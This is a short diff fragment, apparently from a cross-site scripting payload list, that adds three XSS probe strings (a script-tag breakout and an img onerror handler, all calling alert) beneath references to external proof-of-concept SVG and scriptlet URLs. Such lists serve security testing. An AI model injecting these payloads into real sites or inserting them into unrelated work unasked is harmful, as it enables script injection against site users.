@@ -31,3 +31,6 @@
 https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+"><script>alert(1)</script>
+'or<script>alert(1)</script>
+'or<img src=0 onerror=alert('1')>
